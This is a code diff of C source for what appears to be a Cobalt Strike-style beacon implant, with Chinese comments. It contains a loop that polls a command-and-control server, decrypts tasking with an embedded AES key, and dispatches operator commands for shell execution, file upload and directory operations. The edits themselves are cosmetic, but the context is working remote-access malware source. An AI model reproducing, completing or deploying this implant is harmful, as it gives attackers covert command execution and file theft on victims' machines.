@@ -9,11 +9,10 @@
 #include <tlhelp32.h>
 #include <tchar.h>
 
-// 声明变量
 extern int SleepTime;
 extern unsigned char aeskey[16];
 
-#define MAX_PACKET 524288
+#define MAX_PACKET 0x80000
 
 VOID executeCommand(unsigned char* commandBuf, uint32_t commandType, size_t commandBuflen);
 
@@ -27,11 +26,11 @@ VOID beacon_main() {
     while (1) {
         // 发送心跳的同时，获取响应内容
         size_t responseSize = 0;
-		// 处理 Job 列表
+		// 处理 Job 任务
         ProcessJobEntry(MAX_PACKET);
         unsigned char* responseEncodeData = GET(cookie_header, &responseSize);
         // 多分配一个字节为了放\0，不然后续 strlen 的长度和 responseSize 对不上
-        // responseSize > 7 ==> responseSize >= Prefix + Suffix
+        // responseSize > 7 ==> responseSize > Prefix + Suffix
         if (responseEncodeData && responseSize > 7) {
             unsigned char* tmp = realloc(responseEncodeData, responseSize + 1);
             if (tmp) {
@@ -47,9 +46,8 @@ VOID beacon_main() {
 
         size_t responseDataLength = 0;
 
-        // 在这个函数还要经过一次 NetBios 解码，一次 XOR 解密对应 Mask，因为 profile 这样写的
+        // 在这个函数还要经过一次 NetBios 解码，一次 XOR 解密对应 Mask，因为 profile 是这样写的
         unsigned char* responseData = parseGetResponse(responseEncodeData, responseSize, &responseDataLength);
-        // 必须放个\0，不然后续 strlen 会出现错误
 
         // 确保为 16 的倍数，进行 AES 解密
         if (responseData && responseDataLength > 16 && responseDataLength % 16 == 0) {
@@ -68,8 +66,8 @@ VOID beacon_main() {
                 BeaconDataInt(&parser);
                 // 这四个字节是所有指令总长度
                 /* 指令数据，当有多条指令发过来时结构如下
-                 *  指令数据包格式：?(4Bytes) |totalLength (4Bytes)| cmdType(4Bytes) | commandLen(4Bytes)
-                 *  | commandBuf(commandLen Bytes) || cmdType(4Bytes) | commandLen(4Bytes) | commandBuf(4Bytes) || ...
+                 *  指令数据包格式：?(4 Bytes) |totalLength (4 Bytes)| cmdType(4 Bytes) | commandLen(4 Bytes)
+                 *  | commandBuf(commandLen Bytes) || cmdType(4 Bytes) | commandLen(4 Bytes) | commandBuf(4 Bytes) || ...
                  */
                 uint32_t totalLength = (uint32_t)BeaconDataInt(&parser);
                 unsigned char* totalBuffer = BeaconDataPtr(&parser, totalLength);
@@ -110,7 +108,7 @@ int main() {
 }
 
  VOID executeCommand(unsigned char* commandBuf, uint32_t commandType, size_t commandBuflen) {
-    unsigned char* postMsg = NULL;           // 此参数用于 DataProcess
+    unsigned char* postMsg = NULL;  // 此参数用于 DataProcess
     size_t msgLength = 0;           // 此参数用于 DataProcess
     int callbackType = 0;           // 此参数用于 DataProcess 不能使用 DWORD 表示 必须有符号 
 
@@ -137,11 +135,11 @@ int main() {
         callbackType = CALLBACK_OUTPUT;
         postMsg = CmdUpload(commandBuf, commandBuflen, &msgLength, "ab");
         break;
-    case  CMD_TYPE_DRIVES:       
+    case CMD_TYPE_DRIVES:       
         callbackType = CALLBACK_PENDING;
         postMsg = CmdDrives(commandBuf, commandBuflen, &msgLength);
         break;
-    case  CMD_TYPE_MKDIR:        
+    case CMD_TYPE_MKDIR:        
         callbackType = CALLBACK_OUTPUT;
         postMsg = CmdMkdir(commandBuf, commandBuflen, &msgLength);
         break;
@@ -187,6 +185,7 @@ int main() {
          * 因为 CmdShell 中会创建线程，线程中会使用 commanfBuf
          * 线程结束后会自动释放 commanfBuf
          * 如果提前释放 commanfBuf 会导致线程访问已释放内存
+         * 继而报错
         */
         CmdShell(commandBuf, commandBuflen);
         break;
@@ -233,7 +232,7 @@ int main() {
         unsigned char* result = "[-] This Command Do Not Accomplish";
         unsigned char* resultMemmory = (unsigned char*)malloc(strlen(result) + 1);
         if (!resultMemmory) {
-            fprintf(stderr, "Memory allocation failed for resultMemmory\n");
+            fprintf(stderr, "Memory allocation failed\n");
             return;
         }
         memcpy(resultMemmory, result, strlen(result));
@@ -243,6 +242,7 @@ int main() {
         break;
     }
 
+    // 有数据返回进入下面分支
     if (callbackType >= 0 && postMsg) {
         DataProcess(postMsg, msgLength, callbackType);
         free(postMsg);
